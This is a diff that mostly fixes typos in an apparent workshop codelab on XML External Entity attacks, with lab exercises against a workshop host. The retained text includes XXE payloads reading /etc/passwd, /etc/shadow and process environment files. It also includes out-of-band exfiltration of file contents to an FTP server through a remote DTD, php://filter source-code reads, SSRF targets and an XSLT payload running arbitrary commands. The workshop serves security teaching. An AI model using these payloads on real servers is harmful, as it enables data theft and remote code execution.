@@ -79,13 +79,13 @@ Duration: 00:05:00
 
 ![XML format examples](assets/intro/xml_everywhere.png)
 
-XML documents are used in plenty of file formats. You have probably already edited a configuration file written in XML. If you have built a website, you will edit or see inevitably HTML. You can also think about MS Office documents (`.docx`), Scalable Vector Graphic (`.svg`) and SOAP requests. Being widely implemented in most programming language, it is a excellent choice for interoperability. The [XML standard](https://www.w3.org/TR/xml/) describes many useful formatting features but we are going to focus on "[entities](https://www.w3.org/TR/xml/#sec-entity-decl)" because of the potential vulnerability it introduces.
+XML documents are used in plenty of file formats. You have probably already edited a configuration file written in XML. If you have built a website, you will edit or see inevitably HTML. You can also think about MS Office documents (`.docx`), Scalable Vector Graphic (`.svg`) and SOAP requests. Being widely implemented in most programming language, it is an excellent choice for interoperability. The [XML standard](https://www.w3.org/TR/xml/) describes many useful formatting features but we are going to focus on "[entities](https://www.w3.org/TR/xml/#sec-entity-decl)" because of the potential vulnerability it introduces.
 
 ### What are XML entities?
 
 XML entities are reference to XML data inside of XML documents. We are mentioning XML data because it can be a literal string, XML tags or any legal XML syntax where it is inserted.
 
-**Entity in HTML are used for special characeters**
+**Entity in HTML are used for special characters**
 
 ![Entity 1](assets/intro/entity1.png)
 
@@ -98,7 +98,7 @@ XML entities are reference to XML data inside of XML documents. We are mentionin
 
 ![Malicious XXE payload](assets/intro/malicious_payload.png)
 
-When the keyword SYSTEM is added to an entity, it will attempt to load content from the specified URL. The value between quote is the URL. For XML parsing done in a small script execute locally, this seems like a nice feature. However, when the parsing is done server side, the URLs from SYSTEM entities are resolved also on the server. A malicious user could point to a file hosted on the remote server. If the server return the parsing result, the user will suddenly reveal the content of this file.
+When the keyword SYSTEM is added to an entity, it will attempt to load content from the specified URL. The value between quote is the URL. For XML parsing done in a small script execute locally, this seems like a nice feature. However, when the parsing is done server side, the URLs from SYSTEM entities are also resolved on the server. A malicious user could point to a file hosted on the remote server. If the server return the parsing result, the user will suddenly reveal the content of this file.
 
 ```xml
 <!DOCTYPE data [
@@ -111,7 +111,7 @@ If the application return the value inside the data node, the content of the fil
 
 ### Interesting files to read
 
-Passwd is a file that is universally present on Linux operating system.
+`passwd` is a file that is universally present on Linux operating system.
 
  - `file:///etc/passwd`
  - `file:///etc/shadow` (Feeling lucky)
@@ -126,16 +126,16 @@ Hostnames, DNS resolvers and network devices information can give precious infor
 
  - `file:///proc/self/cwd/FILE` : Relative paths are likely to work. `file:///proc/self/cwd/` is an alternative to `./`.
  - `file:///proc/self/cmdline` : This virtual file is returning the command and the arguments used to start the process.
- - `file:///proc/self/environ` : Environment defined for the context of the current process.
+ - `file:///proc/self/environ` : Environment defined in the context of the current process.
 
 
-There are few files that are containing the system version. These are also file with no special characters (Useful for testing).
+There are few files that are containing the system version. These are also files with no special characters (Useful for testing).
 
  - `file:///proc/version`
  - `file:///etc/lsb-release`
  - `file:///etc/issue`
 
-For testing purpose, it might be interesting to read virtual file with infinite content. The objective for the attacker would be to either do time based detection or create some sort of Denial of Service (DOS).
+For testing purpose, it might be interesting to read virtual file with infinite content. The objective of the attacker would be to either do time based detection or create some sort of Denial of Service (DOS).
 
  - `file:///dev/urandom` & `file:///dev/zero`
 
@@ -165,11 +165,11 @@ By submitting the form with the news feed (Atom feed) from the sub-reddit netsec
 
 ![Preview website](assets/exercise1/image5.png)
 
-At this point, we can assume that the server is parsing this XML source because we are only seeing one HTTP request in our proxy. The URL could have been fetch from the browser in Javascript but it is not the case here.
+At this point, we can assume that the server is parsing this XML source because we are only seeing one HTTP request in our proxy. The URL could have been fetched from the browser in JavaScript but it is not the case here.
 
 
 
-#### Serving Your XML Files
+#### Serving your XML Files
 
 For the workshop, you can use your shell to serve HTTP requests. As you can see below, you can start your simple web server with the command : `python -m http.server 8123`.
 
@@ -178,13 +178,13 @@ Negative
 
 ![Preview website](assets/exercise1/image6.png)
 
-#### Sending a Basic Payload
+#### Sending a basic payload
 
-It is always best to start with a simple working XML file rather than submit first with a complex and specific payload. Sometime failure to load our XML can be cause by simple syntax issue. XML can be unforgiving regarding the order of XML syntax, mistyped elements and unsupported characters.
+It is always best to start with a simple working XML file rather than submit first with a complex and specific payload. Sometime failure to load our XML can be caused by simple syntax issue. XML can be unforgiving regarding the order of XML syntax, mistyped elements and unsupported characters.
 
 ![Preview website](assets/exercise1/image9.png)
 
-Once the file is saved, you can submit an URL to this file. The URL must be public.
+Once the file is saved, you can submit a URL to this file. The URL must be public.
 
 ![Preview website](assets/exercise1/image7.png)
 
@@ -193,7 +193,7 @@ The result page should look like the following. It is a confirmation that our ba
 ![Preview website](assets/exercise1/image8.png)
 
 
-#### Confirming that XML entities are enabled
+#### Confirming that XML Entities are enabled
 
 Next, we will attempt to fetch a file on the file system with an XML Entities. The Atom should look as follows.
 
@@ -224,12 +224,12 @@ Positive
 
 <!-- =========================== -->
 
-## Ex-filtration with remote DTD
+## Exfiltration with remote DTD
 Duration: 00:05:00
 
 ### Out-of-band Exfiltration
 
-XML parsing remotely will not always return content directly. If you are uploading a document such as a data file (`.xml`) or an MS Office document (`.docx`), you might not received the content parse from those documents.
+XML parsing remotely will not always return content directly. If you are uploading a document such as a data file (`.xml`) or a MS Office document (`.docx`), you might not receive the content parse from those documents.
 
 We need to find a way exfiltrate data **during** the parsing. Unfortunately, it is possible refer to an entity from another entity *in the same DOCTYPE*. This limitation comes from the way XML parsers interpret.
 
@@ -243,13 +243,13 @@ We need to find a way exfiltrate data **during** the parsing. Unfortunately, it 
 ```
 *This payload will not work*
 
-A workaround for this limitation was discovered by the researchers [Alexey Osipov and Timur Yunusov](https://www.youtube.com/watch?v=eBm0YhBrT_c#t=11m51) that allow the construction of URL with data coming from other entities. The first version of this payload uses the Gopher protocol.
+A workaround for this limitation was discovered by researchers [Alexey Osipov and Timur Yunusov](https://www.youtube.com/watch?v=eBm0YhBrT_c#t=11m51) that allow the construction of URL with data coming from other entities. The first version of this payload uses the Gopher protocol.
 
 
 ![XXE Gopher exfiltration](assets/out-of-bound/external_dtd.gif)
 
 Negative
-: In practice, the previous technique is not perfect. Any file with XML incompatible characters (`&`, `\n`, `\x80`, etc) would break the URL. The /etc/issue is one of the rare file safe to include.
+: In practice, the previous technique is not perfect. Any file with XML incompatible characters (`&`, `\n`, `\x80`, etc) would break the URL. The `/etc/issue` is one of the rare file safe to include.
 
 The previous technique was [updated with a variant](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html). This variant replaces Gopher with the FTP protocol. It is very useful because the Gopher is deprecated and only available on [old version of Java](https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0).
 
@@ -272,7 +272,11 @@ The following payload requires a remote DTD file to be hosted on a web server. T
 <!ENTITY % all "<!ENTITY send SYSTEM 'ftp://test:%file;@my.ftp.server/'>"> %all;
 ```
 
-In order to capture the file content, you need to record the password sent to your FTP server. To serve this purpose, Ivan Novikov has created [a mock FTP server](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html) that respond just enough to record password. (FTP client will not authenticate if the handshake is incomplete.)
+In order to capture the file content, you need to record the password sent to your FTP server. To serve this purpose, Ivan Novikov has created [a mock FTP server](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html) that respond just enough to record a password. (FTP clients will not authenticate if the handshake is incomplete.)
+
+
+
+
 
 
 
@@ -324,13 +328,13 @@ One easier way to use the encoding tags from the HackVertor plugin. It is a good
 
 #### Payload execution
 
-Every step of the XML parsing is susceptible to failed due to small error. If you get result different than the screenshot investigate the potential causes.
+Every step of the XML parsing is susceptible to fail due to a small error. If you get result different than the screenshot investigate the potential causes.
 
-First, the DTD is fetch. This confirm that our XML payload is well-formed. If it is not the case, verify the URL you specified in the XML entity.
+First, the DTD is fetched. This confirms that our XML payload is well-formed. If it is not the case, verify the URL you specified in the XML entity.
 
 ![XXE HTTP Request Received](assets/exercise2/image13.png)
 
-Second, the FTP is contacted. Confirming that the concatenation succeed.
+Second, the FTP is contacted. Confirming that the concatenation succeeds.
 
 ![XXE FTP Request Received](assets/exercise2/image12.png)
 
@@ -359,19 +363,24 @@ Duration: 00:05:00
 
 We already mentioned the `php://` protocol. This protocol available - of course - only on PHP is providing few options to encode or decode file content.
 
-XXE have major limitations regarding which file can be read. In general, you can't read non-ascii characters or special characters that are not XML compatible. You might have notice when doing the first two exercices.
+XXE have major limitations regarding which file can be read. In general, you can't read non-ASCII characters or special characters that are not XML compatible. You might have noticed when doing the first two exercises.
 
 ### Encoding file content
 
-In order to read file with special characters, we can take advantage of the php protocol 
+In order to read file with special characters, we can take advantage of the php protocol.
 
 `php://filter/convert.base64-encode/resource=/source_code.zip`
 
 Reference: [php:// - php.net documentation](https://www.php.net/manual/en/wrappers.php.php)
 
+With this new capability, it opens the door to read most configuration files, database files and more.
+
+=========
+
+
 ### Other interesting protocols
 
-Here is an exhaustive list of protocols that could be useful when exploiting an XXE.
+Here is an exhaustive list of protocols that could be useful when exploiting XXE.
 
 #### file: protocol
 
@@ -385,14 +394,14 @@ Examples:
 
 #### http: protocol
 
-Nothing suprising here. You can trigger GET request to HTTP service. While it can be a starting point for Server Side Request Forgery (SSRF), the response is not likely to be readable. Most webpages are not perfectly XML valid.
+Nothing surprising here. You can trigger GET request to HTTP service. While it can be a starting point for Server Side Request Forgery (SSRF), the response is not likely to be readable. Most webpages are not perfectly XML valid.
 
 Example:
  - `https://192.168.0.150:8000/`
  - `https://localhost/phpMyAdmin/`
 
 :negative
-`https://169.254.169.254/latest/user-data` AWS metadta URLs now require a special header. It is unlikely that you will be able to access it with an XXE.
+`https://169.254.169.254/latest/user-data` AWS metadata URLs now require a special header. It is unlikely that you will be able to access it with XXE.
 
 
 #### ftp: protocol
@@ -406,13 +415,13 @@ Example:
 #### gopher: protocol
 
 Another option for data exfiltration is the gopher protocol. It allows to connect to any server with a TCP with an arbitrary message. The path section of the URL is the data that will be written to the TCP socket.
-It is rarely available as it require very [old versions of Java](https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0).
+It is rarely available as it requires very [old versions of Java](https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0).
 
 - `gopher://server/?data`
 
 #### jar: protocol
 
-The `jar` protocol is a very special case. It is only available on Java applications. It allows to access files inside a PKZIP archive (`.zip`, `.jar`, ...). You will see in the last exercise how it can be used to write file to a remote server.
+The `jar` protocol is a very special case. It is only available on Java applications. It allows to access files inside a PKZIP archive (`.zip`, `.jar`, ...). You will see in the last exercise how it can be used to write files to a remote server.
 
 Example:
 - `jar:file://./archive.zip!config.properties`
@@ -425,12 +434,23 @@ Example:
 - `netdoc:///etc/passwd`
 
 
+
+
+
+
+
+
+
+
+
+
+
 <!-- =========================== -->
 
 ## LAB 3: Filter encoding
 Duration: 00:15:00
 
-For this third exercise, we are using a website that is very similar to the first exercise. It is also parsing Atom feed. It is however using a different language : PHP. The service is at the URL : [http://xxe-workshop.gosec.co:8022](http://xxe-workshop.gosec.co:8022)
+For this third exercise, we are using a website that is very similar to the first exercise. It is also parsing Atom feed. It is, however, using a different language : PHP. The service is at the URL : [http://xxe-workshop.gosec.co:8022](http://xxe-workshop.gosec.co:8022)
 
 ![Preview website](assets/exercise3/image4.png)
 
@@ -438,7 +458,7 @@ For this third exercise, we are using a website that is very similar to the firs
 
 #### Using a PHP filter
 
-Similarly to the first exercise, we are going to host a malicious Atom feed on a web server. This XML document will use PHP base64-encoding filter inside an XML entitiy.
+Similarly to the first exercise, we are going to host a malicious Atom feed on a web server. This XML document will use PHP base64-encoding filter inside an XML entity.
 
 ![XXE PHP filter payload](assets/exercise3/image5.png)
 
@@ -448,7 +468,7 @@ The response will be in Base64 because, this is what we instruct the server to d
 
 
 Positive
-: To read the `.svn/wc.db`, you have two options. You can either loaded it with a sqlite client or simply look at it in a text editor. The first option would scale better with large repository history.
+: To read the `.svn/wc.db`, you have two options. You can either loaded it with a SQLite client or simply look at it in a text editor. The first option would scale better with large repository history.
 
 
 #### Hidden page
@@ -466,7 +486,7 @@ When the response is received, we can decode the base 64 blob to view the PHP so
 ![Decoding the Base64 response in Burp](assets/exercise3/image9.png)
 
 Positive
-:  **Can you spot the vulnerability?** <br/> You can now review the source of the developper script. You should be able to find an additionnal vulnerability (unrelated to XXE) that will give you remote code execution.
+:  **Can you spot the vulnerability?** <br/> You can now review the source of the developer script. You should be able to find an additional vulnerability (unrelated to XXE) that will give you remote code execution.
 
 
 Positive
@@ -486,7 +506,7 @@ Duration: 00:05:00
 
 ### jar: purpose
 
-The `jar` protocol is only available on Java applications. It allows to access file inside a PKZIP file (`.zip`, `.jar`, ...).
+The `jar` protocol is only available on Java applications. It allows to access files inside a PKZIP file (`.zip`, `.jar`, ...).
 
 
 It works for local file..
@@ -499,26 +519,26 @@ And with remote file..
 jar:https://download.host.com/myarchive.zip!/file.txt
 ```
 
-### Behind the scene
+### Behind the scenes
 
-What is happening behind the scene with the HTTP URL with a remote ZIP? There are in fact multiple steps that lead to the file being extracted.
+What is happening behind the scenes with the HTTP URL with a remote ZIP? There are in fact multiple steps that lead to the file being extracted.
 
-1. It does an HTTP request to load the zip archive. `https://download.host.com/myarchive.zip`
-2. It save the HTTP response to a temporary location. `/tmp/...`
-3. It extract of the archive.
+1. It makes an HTTP request to load the zip archive. `https://download.host.com/myarchive.zip`
+2. It saves the HTTP response to a temporary location. `/tmp/...`
+3. It extracts of the archive.
 4. It reads the `file.zip`
-5. It delete the temporary files.
+5. It delete temporary files.
 
 What if we manage to stop the sequence at the second step?.. It is possible to do so!
 
 ### Complement: XSLT
 
 Positive
-: This segment is required for the next exercise. This vector is not consider an XXE as it focus on a different feature of XML.
+: This segment is required for the next exercise. This vector is not considered an XXE as it focus on a different feature of XML.
 
-Extensible Stylesheet Language Transformations (or XSLT) is a text format that describe the transformation applied to XML documents. The official specification provide basic transformation. Language such as Java and .NET have introduce extension to allow invocation of method from the stylesheet. The Java implementation is more prone to vulnerability being enable by default. It has the capability to access all class in the classpath.
+Extensible Stylesheet Language Transformations (or XSLT) is a text format that describes the transformation applied to XML documents. The official specification provides basic transformation. Languages such as Java and .NET have introduced extension to allow the invocation of method from the stylesheet. The Java implementation is more prone to vulnerability being enabled by default. It has the capability to access all class in the classpath.
 
-If you are seeing a feature that allow you to configure an XSLT file in a Java application, it is likely to trigger remote code execution.
+If you are seeing a feature that allows you to configure an XSLT file in a Java application, remote code execution might be possible.
 
 ```xml
 <xsl:stylesheet version="1.0"
@@ -537,7 +557,14 @@ exclude-result-prefixes="date">
 </xsl:stylesheet>
 ```
 
-In the root node, classes (`java.lang.Runtime` and `java/java.lang.String`) are imported for future reference. To customize the previous payload, you need to edit the assignment `<xsl:variable name="cmd"><![CDATA[touch /tmp/test1234]]></xsl:variable>`. The touch command can be replace with any command available on the server.
+In the root node, classes (`java.lang.Runtime` and `java/java.lang.String`) are imported for future reference. To customize the previous payload, you need to edit the assignment `<xsl:variable name="cmd"><![CDATA[touch /tmp/test1234]]></xsl:variable>`. The `touch` command can be replaced with any command available on the server.
+
+
+
+
+
+
+
 
 <!-- =========================== -->
 
@@ -552,9 +579,9 @@ Duration: 00:15:00
 
 #### Generating a script
 
-To exploit this service, we will need to evaluate multiple URLs with the same XXE base payload. To send those similar request, we can encapsule the logic inside a script.
+To exploit this service, we will need to evaluate multiple URLs with the same XXE base payload. To send those similar requests, we can encapsulate the logic inside a script.
 
-Here is demonstration of the Burp plugin [Reissue Request Scripter](https://portswigger.net/bappstore/6e0b53d8c801471c9dc614a016d8a20d). The request exported is the POST request to `/admin/upload`. 
+Here is a demonstration of the Burp plugin [Reissue Request Scripter](https://portswigger.net/bappstore/6e0b53d8c801471c9dc614a016d8a20d). The request exported is the POST request to `/admin/upload`. 
 
 Negative
 : Make sure to submit the form in order to see the request in your Burp history.
@@ -578,7 +605,7 @@ You can test that the script is working properly by evaluating a test file. The 
 #### Exploiting with the jar protocol
 
 
-In order to persist a file more than a second, we must serve the file with a web server that will hold connection as long as possible. A simple Tornado server is provided in the workshop repository. You can see in the script that a call to the `sleep` function is done to prevent the closed connection when the function return. As soon as the connection would closed, the Java application would attempt to extract the ZIP and dispose the file leaving us no time to use the file writen to disk.
+In order to persist a file more than a second, we must serve the file with a web server that will hold connection as long as possible. A simple Tornado server is provided in the workshop repository. You can see in the script that a call to the `sleep` function is done to prevent the connection to close when the function return. As soon as the connection would close, the Java application would attempt to extract the ZIP and dispose the file leaving us no time to use the file written to disk.
 
 ![Slow HTTP server script](assets/exercise4/image9.png)
 
@@ -589,7 +616,7 @@ In the following stylesheet, we are invoking the methods `Runtime.getRuntime().e
 ![XSLT payload](assets/exercise4/image13.png)
 
 
-#### Putting the pieces togetter
+#### Putting the pieces together
 
 **Step 1: The "slow" HTTP server**
 
